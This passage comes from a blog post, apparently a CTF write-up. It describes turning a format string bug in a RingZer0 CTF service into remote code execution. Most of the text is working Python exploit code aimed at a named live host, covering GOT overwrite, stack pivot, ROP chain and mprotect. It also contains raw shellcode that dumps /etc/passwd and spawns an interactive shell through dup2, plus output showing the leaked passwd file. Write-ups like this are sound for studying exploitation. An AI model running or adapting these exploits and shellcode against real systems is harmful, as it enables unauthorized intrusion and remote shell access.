    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)    # write byte

    dump1 = grab_value_indirectly(636+offset)
    return hex(dump1)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

print "read from 0x400000: {}".format(read_from_address(0x400000, format_offset))
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit3.py
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x7369
scratch is parameter 1601
read from 0x400000: 0x10102464c457f
</code></pre>

<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<pre><code class="bash">...snip...
00014a0: ffc7 8580 edff ff41 4141 41c7 8584 edff  .......AAAA.....
00014b0: 0042 4242 42c7 8588 edff ff43 4343 43c6  .BBBB......CCCC
...snip...
</code></pre>

<p>This looks familiar, doesn&rsquo;t it?</p>

<pre><code class="c">char test[] = "AAAABBBBCCCC";
</code></pre>

<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<pre><code class="bash">$ xxd -c 1 dump |grep 1260 -A512 | awk '{print $2}' |tr -d '\n'
b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
...snip...
</code></pre>

<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<pre><code class="bash">$ echo 'b800...' | rasm2 -d -b 64 -o 0x401260 -

mov dword [rbp-0x50], 0x0
mov eax, [rbp-0x20]
cmp eax, [rbp-0x1c]
jnz dword 0x4015d1
// char *response = NULL;
mov qword [rbp-0x58], 0x0       
// char *cleanBuffer = NULL;
mov qword [rbp-0x60], 0x0   
// response = (char*)malloc(2048);  
mov edi, 0x800                  
call dword 0x400ba0             
mov [rbp-0x58], rax
// memset(response, 0, 2048);
mov rax, [rbp-0x58]
mov edx, 0x800
mov esi, 0x0
mov rdi, rax
call dword 0x400b40
// cleanBuffer = (char*)malloc(strlen(buf));
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 
mov rdi, rax
call dword 0x400ba0
mov [rbp-0x60], rax
lea rax, [rbp-0x11f0]
</code></pre>

<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<pre><code>0000b00: ff25 fa0f 0000 6807 0000 00e9 70ff ffff  .%....h.....p...
</code></pre>

<p>This disassembles to</p>

<pre><code class="bash">$ rasm2 -d -b 64 -o 0x400b00 -
ff25fa0f0000
jmp qword [rip+0xffa]
</code></pre>

<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<pre><code>0000f70: 5348 83ec 1048 85ff 7416 8b05 4ca9 3400  SH...H..t...L.4.
0000f80: 85c0 7526 4883 c410 5be9 82fb ffff 6690  ..u&amp;H...[.....f.
</code></pre>

<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<pre><code>objdump -d -M intel libc-2.13.so |grep system -A10

000000000003fc70 &lt;__libc_system&gt;:
   3fc70:   53                      push   rbx
   3fc71:   48 83 ec 10             sub    rsp,0x10
   3fc75:   48 85 ff                test   rdi,rdi
   3fc78:   74 16                   je     3fc90 &lt;__libc_system+0x20&gt;
   3fc7a:   8b 05 6c b9 34 00       mov    eax,DWORD PTR [rip+0x34b96c]        # 38b5ec &lt;argp_program_version_hook+0x1b4&gt;
   3fc80:   85 c0                   test   eax,eax
   3fc82:   75 26                   jne    3fcaa &lt;__libc_system+0x3a&gt;
   3fc84:   48 83 c4 10             add    rsp,0x10
   3fc88:   5b                      pop    rbx
   3fc89:   e9 82 fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
   3fc8e:   66 90                   xchg   ax,ax
</code></pre>

<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// disassembly:
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 &lt; the GOT entry for strlen will be pointing to system!
</code></pre>

<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<pre><code class="python">def write_on_stack(what, where, offset):
    # write out all the bytes of what
    # used to write addresses on the stack
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
# from libc-2.13-38 -- NOT CORRECT
libc_base = strlen_addr - 0x80b70
print "[+] libc_base is at {}.".format(hex(libc_base))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
write_on_stack(0x601e20, 0, format_offset)
write_on_stack(0x601e21, 8, format_offset)
write_on_stack(0x601e22, 16, format_offset)

# ok, now try to set three bytes in one go
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

# should write out "BAS" in one go
payload = "%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)

s.recv(128)
s.send(payload)
data = s.recv(64)
s.close()

# read it back to check!
check = read_from_address(0x601e20, format_offset)
print hex(check)
</code></pre>

<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<pre><code>"%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)
</code></pre>

<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

<pre><code class="bash">$ python sploit7.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x601b
scratch is parameter 1601
[+] strlen is at 0x7f82b7326c40.
[+] libc_base is at 0x7f82b72a60d0.
[+] wrote 0x601e20 to 1601
[+] wrote 0x601e21 to 1602
[+] wrote 0x601e22 to 1603

0x534142
</code></pre>

<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<pre><code class="c">strncpy(cleanBuffer, buf, strlen(buf) - 1);
</code></pre>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// dissambled:
lea rax, [rbp-0x11f0]
mov rdi, rax        // rax and rdi now point to buf
call dword 0x400b00 // strlen
</code></pre>

<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<pre><code>stack lifting
syscall
pop rax
pop rdi
pop rsi
pop rdx
</code></pre>

<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<pre><code>0x041cf9: ret
</code></pre>

<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<pre><code>0x0002028a : pop r15; ret
0x0006933f : lea rax, [rbp + r15]; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x000eb938 : mov rax, [rax]; ret
0x0002c10e : xchg eax, edi; ret
</code></pre>

<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<pre><code class="python">import struct, time
from socket import *

def p(x):
    return struct.pack('L', x &amp; 0xffffffffffffffff)

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)        # write byte

    dump1 = grab_value_indirectly(636+offset)
    return dump1

# write a value to a string format parameter
def write_on_stack(what, where, offset):
    # write out all the bytes of what
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
libc_base = strlen_addr - 0x80c40
print "[+] libc_base is at {}.".format(hex(libc_base))

STACK_PIVOT = libc_base + 0x082cfe      # add rsp, 0x100; ret
print "[+] stack pivot gadget is at {}.".format(hex(STACK_PIVOT))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
# strlen
write_on_stack(0x601b00, 0, format_offset)
write_on_stack(0x601b01, 8, format_offset)
write_on_stack(0x601b02, 16, format_offset)

# need to write out the last three bytes of the STACK_PIVOT gadget over strlen's bytes
writebytes = STACK_PIVOT &amp; 0xffffff 

payload = ''
lastbyte = 0

# build format string to set three bytes at once
for i in range(3):
    if lastbyte &lt;= (writebytes &amp; 0xff):
        byte_to_write = (writebytes &amp; 0xff) - lastbyte
    else:   
        byte_to_write = 256 + (writebytes &amp; 0xff) - lastbyte

    payload += "%{}c".format(byte_to_write)
    lastbyte = writebytes &amp; 0xff

    writebytes &gt;&gt;= 8
    payload += "%{}$hhn".format(format_offset+636+i)

payload += "\n"

print "[+] writing {} to strlen's GOT entry".format(hex(STACK_PIVOT &amp; 0xffffff))

print "[+] format string payload: {}".format(payload)

# connect and send the format string
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))
s.recv(128)
s.send(payload)
s.recv(64)
s.close()


# now, strlen's GOT entry will point to the stack lifting gadget

# let's prepare the ROP chain
# here are the gadgets
SYSCALL = libc_base + 0x0ad215
POP_RAX = libc_base + 0x041dc8
POP_RSI = libc_base + 0x021535
POP_RDI = libc_base + 0x02028b
POP_RDX = libc_base + 0x0a834b

ropchain = ''
# mprotect 0x400000 to rwx, so we can write AND execute from it
ropchain += p(POP_RAX+1) * 8       # points to ret; effectively, a NOP!
ropchain += p(POP_RAX)
ropchain += p(10)                  # syscall mprotect
ropchain += p(POP_RDI)
ropchain += p(0x400000)            # start of buffer to mprotect
ropchain += p(POP_RSI)
ropchain += p(0x1000)              # length of buffer
ropchain += p(POP_RDX)
ropchain += p(7)                   # flags; rwx
ropchain += p(SYSCALL)             # after executing this syscall, 0x400000 should be rwx

# we need to fetch the socket from memory
ropchain += p(libc_base + 0x2028a) # pop r15; ret
ropchain += p(-0x48)               #
ropchain += p(libc_base + 0x6933f) # lea rax, [rbp + r15]; set rax to address that contains socket descriptor
ropchain += p(31337)*5             # junk for all the pop r64's
ropchain += p(libc_base + 0xeb938) # mov rax, [rax]; grabs value of socket descriptor
ropchain += p(libc_base + 0x2c10e) # xchg eax, edi; edi now contains the socket descriptor

# read in the shellcode from the socket (sockfd in rdi already)
ropchain += p(POP_RAX)
ropchain += p(0)                   # syscall read
ropchain += p(POP_RSI)
ropchain += p(0x400000)            # start of buffer
ropchain += p(POP_RDX)
ropchain += p(0x1000)              # size of buffer
ropchain += p(SYSCALL)             # after this syscall, the shellcode should be at 0x400000
ropchain += p(0x400000)            # so return to it!

# rdi still contains socket fd!
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

print s.recv(128)
# send our ropchain
s.send(ropchain)

time.sleep(0.1)
# modified read /etc/passwd, original by Mr.Un1k0d3r
s.send("\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41")

# handle the incoming connection; in this case, grab the contents of /etc/passwd
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>And the output!</p>

<pre><code class="bash">parameter 5 points to:  0x7fffb6657fc8
address pointed to by parameter 5 contains:  0x7fffb6658f51
scratch contains:  0x72632f656d6f682f
scratch is parameter 1123
[+] strlen is at 0x7f7af6e72c40.
[+] libc_base is at 0x7f7af6df2000.
[+] stack pivot gadget is at 0x7f7af6e74cfe.
[+] wrote 0x601b00 to 1123
[+] wrote 0x601b01 to 1124
[+] wrote 0x601b02 to 1125
[+] writing 0xe74cfe to strlen's GOT entry
[+] format string payload: %254c%1123$hhn%78c%1124$hhn%155c%1125$hhn

HF Remote Secure Shell [1.3.37]

Password:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
crackme:x:1001:1001::/home/crackme:/bin/sh
*** Connection closed by remote host ***
</code></pre>

<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<pre><code>bits 64

push rdi
push rdi
push 33         ; dup2
pop rax         ; set rax to dup2
                ; rdi still contains the socket fd
xor esi, esi    ; stdin
syscall
pop rdi
inc rsi         ; stdout
syscall
pop rdi
inc rsi         ; stderr
syscall

jmp _there
_here:
pop rdi         ; points to /bin/sh
xor esi, esi    ; argv = NULL
xor edx, edx    ; argp = NULL
push 59         ; execve
pop rax
syscall

push 60         ; exit
pop rax
syscall

_there:
call _here
db "/bin/sh", 0
</code></pre>

<p>After sticking that shellcode in the exploit, I got a shell!</p>

<pre><code class="python">s.send("\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")
</code></pre>

<p><img src="/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

<p>Until the next #maximumoverkill :]</p>
]]></content>
  </entry>
  
</feed>
